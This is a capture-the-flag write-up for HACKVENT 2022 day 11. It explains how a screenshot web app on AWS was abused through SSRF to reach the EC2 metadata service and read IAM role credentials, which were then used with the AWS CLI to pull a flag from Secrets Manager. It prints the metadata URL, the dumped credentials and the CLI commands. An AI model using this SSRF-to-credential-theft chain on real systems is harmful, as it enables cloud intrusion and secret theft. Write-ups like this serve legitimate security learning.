CSS: ../meta/avenir-white.css

[← Day 10](../day10/) / [↑ TOC](../README.md) / [→ Day 12](../day12/)


# Day 11 / HV22.11 Santa's Screenshot Render Function



## Challenge

* Author: Deaths Pirate
* Tags:   `#web-security`
* Level:  medium

Santa has been screenshotting NFTs all year. Now that the price has dropped, he
has resorted to screenshotting websites. It's impossible that this may pose a
security risk, is it?

You can find Santa's website here: <https://hackvent.deathspirate.com>



## Solution

Although it says "medium" I do not believe in that label. It was pretty hard.
I needed some hand holding and _Oxi_ came through. Thanks a lot!

Santa's webpage was as the title says a web app that took screenshots of other
webpages if you entered their URL into the form field.

![](screenWebapp.png)

One of the difficulties to overcome for me was figuring out that 
[AWS (Amazon Web Services)][aws] were the main theme of the challenge. Yes,
there was a "Powered by AWS"-Logo but other than that, I couldn't find any hints
on that even in retrospective.

I had a gazillion wrong theories as to why this challenge was not running in a
docker container like all the other challenges so far. Going through the HTML-,
CSS-, JS-Code brought up nothing at least initially. I looked into picture data,
at EXIF data, request, response and cookie data, tried to figure out how
everything worked together. I even thought about putting up a website, taking a
screenshot of it and then looking at the traffic coming from Santa's screenshot
service. For a while I was convienced that we were supposed to access older
screenshots but had no clue on how to do that. At another point I was terrified,
that this challenge was about
[NFTs in combination with AWS' Managed Blockchain][awsNFT] because "NFT" was
mentioned in the challenge description. `:-C`

[aws]: https://en.wikipedia.org/wiki/Amazon_Web_Services
[awsNFT]: https://aws.amazon.com/blogs/database/part-1-develop-a-full-stack-serverless-nft-application-with-amazon-managed-blockchain/


### Part 1 - The first half of the flag

At one point I saw that the small santa picture of the web page is served from a
AWS S3 server:

<img src="3723050.png" width=20% height=20%>

`https://hackvent2022.s3.eu-west-2.amazonaws.com/3723050.png`

I had a look at the root directory of that server and found some XML-data that
finally meant a little bit of progress ...

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult
	xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
	<Name>hackvent2022</Name>
	<Prefix></Prefix>
	<Marker></Marker>
	<MaxKeys>1000</MaxKeys>
	<IsTruncated>false</IsTruncated>
	<Contents>
		<Key>3723050.png</Key>
		<LastModified>2022-11-05T17:34:55.000Z</LastModified>
		<ETag>&quot;74b18f977180ce6366f8ef8954409781&quot;</ETag>
		<Size>57382</Size>
		<StorageClass>STANDARD</StorageClass>
	</Contents>
	<Contents>
		<Key>aws-logo-500x500.webp</Key>
		<LastModified>2022-11-06T02:48:24.000Z</LastModified>
		<ETag>&quot;a8e941e05c0f0419183c8438c1310bc5&quot;</ETag>
		<Size>10936</Size>
		<StorageClass>STANDARD</StorageClass>
	</Contents>
	<Contents>
		<Key>flag1.txt</Key>
		<LastModified>2022-11-05T17:34:56.000Z</LastModified>
		<ETag>&quot;0011e3e5a6dbde2218af677401f8f9b2&quot;</ETag>
		<Size>306</Size>
		<StorageClass>STANDARD</StorageClass>
	</Contents>
</ListBucketResult>
```

Of the three data objects in this S3 bucket, two were pictures used on the main
web page and one was - nomen est omen - `flag1.txt`, i.e. the first part of the
flag …

```
Congratulations! You've found .... oh no wait

Santa told us that sometimes S3 buckets aren't so secure :/

We've added an extra step to make sure the flag doesn't get breached, we split
it in two and put the other half somewhere .... Secret ;)

Here's the first half anyway:

HV22{H0_h0_h0_H4v3_&_
```


### Part 2 - The second half of the flag

The second part was a lot harder. I didn't really know anything about building
web apps with AWS. But I learned along the way that they are usually made from
multiple AWS products. A DNS query ...

```
$ dig hackvent.deathspirate.com

[...]

;; ANSWER SECTION:
hackvent.deathspirate.com. 7886	IN	CNAME	hackvent-elb-589574575.eu-west-2.elb.amazonaws.com.
hackvent-elb-589574575.eu-west-2.elb.amazonaws.com. 60 IN A 18.169.219.7
hackvent-elb-589574575.eu-west-2.elb.amazonaws.com. 60 IN A 18.133.18.6
hackvent-elb-589574575.eu-west-2.elb.amazonaws.com. 60 IN A 13.40.233.120

[...]
```

... and subsequent reverse DNS queries (done with
<https://mxtoolbox.com/ReverseLookup.aspx>) showed that the main server is an
EC2 server ...

```
ec2-18-169-219-7.eu-west-2.compute.amazonaws.com
ec2-18-133-18-6.eu-west-2.compute.amazonaws.com
ec2-13-40-233-120.eu-west-2.compute.amazonaws.com
```

The [EC2 documentation explains][awsMeta] that for every EC2 instance there is a
way to get meta data by calling `http://169.254.169.254/latest/meta-data/`. The
problem is, that this service is only available internally.

**But** - and this is the big thing about this challenge - **the program**
(probably a headless Chrome browser) **that does take the screenshots for the
web app runs on that EC2 instance and it does have internal access. This means
you can order the web app to take a sceenshot of the URL**
`http://169.254.169.254/latest/meta-data/` **and it will happily do so and
present you with the screenshot** `(@_@)` ...

[awsMeta]: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html

![](screenWebappMeta.png)

The only tiny hint for this was a sentence on the web app page that said: \
`Christmas in the Cloud! So Meta :D`

By looking around it this directory structure it's not hard to find something
interesting ...

![](screenWebappCreds.png)

After a short lived moment of happiness came the realisation that this is just a
screenshot ... there is no text to copy/paste ... as in "OMFG, am I supposed to
type that out ?! Srsly ? 1300-ish characters of jibberish ? In this font ?". And
yes you totally had to do that... if you were one of the first few solvers. But
the uproar about this in the chats became exuberant so an easier way was added
in the form of a hidden text field that contained the HTML code of the webpage
from the screenshot if and only if the URL was ...

`http://169.254.169.254/latest/meta-data/iam/security-credentials/Hackvent-SecretReader-EC2-Role`

This `Hackvent-SecretReader-EC2-Role`-file contains so called IAM credentials
(Identity and Access Management). Here is it in clean form. (Note that there is
an expiration time that made typing it out even more horrifying `:-)`)

```
{
  "Code" : "Success",
  "LastUpdated" : "2022-12-11T16:12:29Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA4G76YFUNN223LBGU",
  "SecretAccessKey" : "e/tdznDR3d4uWsdfqkAXedrhregVRUJie1M3BaHX",
  "Token" : "IQoJb3JpZ2luX2VjEGgaCWV1LXdlc3QtMiJHMEUCIQCll023py2NRM7a403grGqfGRD1QfGbPQ5fOa627rsKPgIgaaEMrphvfY7A5r2wtc1gGtIPdm2lUTxgIYwSIVEBNDkq1gQIkf//////////ARAAGgw4Mzk2NjM0OTY0NzQiDNCIIF45zWCJeFbUxyqqBLY3NASIIM3yQb02stalyG1MVZaw6wRc6zReGIxXqGnI6H/Px8ZSKjEgy3wsbDxfjg7y61pX+5yywuellewJnOiGMqfTgqD7u4/h2cztsGT3GDZI3l2GD61PfkbSbac0DoShjcBDXTfNvh10MK4FC3JeM8YW0s4iEJ3BJUnK6Pa+2NF6fQ8EjiPwPWLEa5qhh66JR4I1hJDgtAewpHUJ6vFMsHcMw7O66oyfHuBf8A5CE7++IIUy9kIJroZxoVE/u+QNMaleNG/ki0KRZ/Yup+22Bg2IRbQ/Lnu5JLhbi3acb7ygIr9eDKhFmBEX+HJZUauppYwOCly/LuBBUft6eZDoo9LzmU9jvZnJ2w3TX6oiYIOgTHV+JWAvKyIraaNVxc3GIR0A4uMeo4laH2Q44KJdOUT7DpoBGuk4QJATaSMJY31R380maL1ZjS3rzQutxsRxC9akK9RyLJIz1F3dT5CscrJSCnXer+LPzbQCbZxcC0g7YuxzLug3PZ03dNbA457jqfZKtBZ05dRPc1p5dNVJ/rDH1l5HYZq3CTiAwsjF38eLZJSKsNPAZqi8vNR8wI1wnHyXdXtT2FPWpFkweVugYJ1D20388DtW6vsRSkgpXlTynjunReh8oDNzmAZfuV2uODkwpejdxSNnc/Qk4WKiBHjT9TXvnBiRESkDdmVT+7qQbWmFDaWrydu17TxWjgSVqXWKE9uRyhiYeE70Sm+QRebIIoJzG4rwMOuC2JwGOqkBTwdFKOjJN9ti6W9Slhxv2cRVRuiiPP6e4Pk2TE/6te+PyY1/o9R5XYlIYmT3ZGzb9JZU2FyN3slp0YkIsCN1Q+zmBz/qZTBtuGWIxHFioqb5JVKmODfn4T6leM+WmRm4AVChdzfWwCNeKUZLAIwAT9HfSptvyOiqkf2NAAJwkjD17ld+MJNy98FNwin21ETCUGcpP+YV4BlqJyv7VaBzxNggDqXdubdfxw==",
  "Expiration" : "2022-12-11T22:26:22Z"
}
```

[According to the AWS documentation][awsIAM] IAM is used to construct additional
access credentials (a _role_ in AWS lingo) for an EC2 server instance. You as
issuer for these IAM creds have fine grained control over what actions (or
_operations_ in AWS lingo) are possible to execute with these creds.

[awsIAM]: https://docs.aws.amazon.com/IAM/latest/UserGuide/introduction.html

After finding out about the [multiple ways to connect][awsConnect] to an EC2
instance, the chosen way was [using the _AWS CLI_][awsCli].

[awsConnect]: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-connect-methods.html#ec2-instance-connect-connecting-console
[awsCli]: https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-welcome.html

After installing the AWS CLI and learning what's what (Boy, there are a lot of
help files!), there was a lot of fiddling necessary to make it work `:-/`.
Finally the IAM credentials were turned into the script
`set_aws_env_variables.sh` that sets them as [environment variables][awsEnv]
(the _Default Region_ was extracted from the EC2 server domain name) ...

[awsEnv]: https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html

```sh
export AWS_ACCESS_KEY_ID="ASIA4G76YFUNN223LBGU"
export AWS_SECRET_ACCESS_KEY="e/tdznDR3d4uWsdfqkAXedrhregVRUJie1M3BaHX"
export AWS_DEFAULT_REGION="eu-west-2"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEGgaCWV1LXdlc3QtMiJHMEUCIQCll023py2NRM7a403grGqfGRD1QfGbPQ5fOa627rsKPgIgaaEMrphvfY7A5r2wtc1gGtIPdm2lUTxgIYwSIVEBNDkq1gQIkf//////////ARAAGgw4Mzk2NjM0OTY0NzQiDNCIIF45zWCJeFbUxyqqBLY3NASIIM3yQb02stalyG1MVZaw6wRc6zReGIxXqGnI6H/Px8ZSKjEgy3wsbDxfjg7y61pX+5yywuellewJnOiGMqfTgqD7u4/h2cztsGT3GDZI3l2GD61PfkbSbac0DoShjcBDXTfNvh10MK4FC3JeM8YW0s4iEJ3BJUnK6Pa+2NF6fQ8EjiPwPWLEa5qhh66JR4I1hJDgtAewpHUJ6vFMsHcMw7O66oyfHuBf8A5CE7++IIUy9kIJroZxoVE/u+QNMaleNG/ki0KRZ/Yup+22Bg2IRbQ/Lnu5JLhbi3acb7ygIr9eDKhFmBEX+HJZUauppYwOCly/LuBBUft6eZDoo9LzmU9jvZnJ2w3TX6oiYIOgTHV+JWAvKyIraaNVxc3GIR0A4uMeo4laH2Q44KJdOUT7DpoBGuk4QJATaSMJY31R380maL1ZjS3rzQutxsRxC9akK9RyLJIz1F3dT5CscrJSCnXer+LPzbQCbZxcC0g7YuxzLug3PZ03dNbA457jqfZKtBZ05dRPc1p5dNVJ/rDH1l5HYZq3CTiAwsjF38eLZJSKsNPAZqi8vNR8wI1wnHyXdXtT2FPWpFkweVugYJ1D20388DtW6vsRSkgpXlTynjunReh8oDNzmAZfuV2uODkwpejdxSNnc/Qk4WKiBHjT9TXvnBiRESkDdmVT+7qQbWmFDaWrydu17TxWjgSVqXWKE9uRyhiYeE70Sm+QRebIIoJzG4rwMOuC2JwGOqkBTwdFKOjJN9ti6W9Slhxv2cRVRuiiPP6e4Pk2TE/6te+PyY1/o9R5XYlIYmT3ZGzb9JZU2FyN3slp0YkIsCN1Q+zmBz/qZTBtuGWIxHFioqb5JVKmODfn4T6leM+WmRm4AVChdzfWwCNeKUZLAIwAT9HfSptvyOiqkf2NAAJwkjD17ld+MJNy98FNwin21ETCUGcpP+YV4BlqJyv7VaBzxNggDqXdubdfxw=="
```

The command `sts` ([AWS Security Token Service][awsSts]) was used to verify
that the creds are working right (otherwise it would return something like
`An error occured (ExpiredToken) [...]`) ...

[awsSts]: https://docs.aws.amazon.com/STS/latest/APIReference/welcome.html

```sh
$ . set_aws_envs.sh
$ aws sts get-caller-identity
{
    "UserId": "AROA4G76YFUNCDEOS6SMF:i-047cd1a3bf326ce6a",
    "Account": "839663496474",
    "Arn": "arn:aws:sts::839663496474:assumed-role/Hackvent-SecretReader-EC2-Role/i-047cd1a3bf326ce6a"
}
```

Now what to do with this access ? Well the text from the first part of the flag
mentioned the word "Secret" prominently and even decorated it with a `;)`.
While reading the various AWS documentation pieces you sooner or later come
across the [AWS Secrets Manager][awsSecrets]. It's used to store secrets ... so,
yeah. It's corresponding CLI command is `secretsmanager` ...

[awsSecrets]: https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html

```sh
$ . set_aws_envs.sh
$ aws secretsmanager list-secrets
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:eu-west-2:839663496474:secret:flag2-UjomOM",
            "Name": "flag2",
            "Description": "Flag for hackvent 2022",
            "LastChangedDate": "2022-12-10T22:04:51.135000+01:00",
            "LastAccessedDate": "2022-12-11T01:00:00+01:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "3cb95787-eea6-475b-9b5b-16bac83b449d": [
                    "AWSPREVIOUS"
                ],
                "8a498b78-e73f-4a97-a0c3-74f365d3aa0d": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2022-11-05T18:44:58.369000+01:00"
        }
    ]
}

$ aws secretsmanager get-secret-value --secret-id flag2
{
    "ARN": "arn:aws:secretsmanager:eu-west-2:839663496474:secret:flag2-UjomOM",
    "Name": "flag2",
    "VersionId": "8a498b78-e73f-4a97-a0c3-74f365d3aa0d",
    "SecretString": "{\"flag2description\":\"Oh Hai! Santa made us split the
        flag up, he gave this part to me and told me to put it somewhere safe, I
        figured this was the best place.  The other half he gave to another Elf
        and told him the same thing, but that Elf told me he just threw it into
        a bucket!  That doesn't sound safe at all!
        \",\"flag2\":\"M3r2y-Xm45_Yarr222_<3_Pirate}\",\"what_is_this\":
        \"Oh I forgot to mention I overheard some of the elves talking about
        making tags available ... maybe they mean gift tags?! Who knows ...
        maybe you can make something out of that ... or not :D \"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2022-12-10T22:04:51.128000+01:00"
}
```

And there it was, the second half. I was very relieved that this challenge was
over.

--------------------------------------------------------------------------------

Flag: `HV22{H0_h0_h0_H4v3_&_M3r2y-Xm45_Yarr222_<3_Pirate}`

[← Day 10](../day10/) / [↑ TOC](../README.md) / [→ Day 12](../day12/)
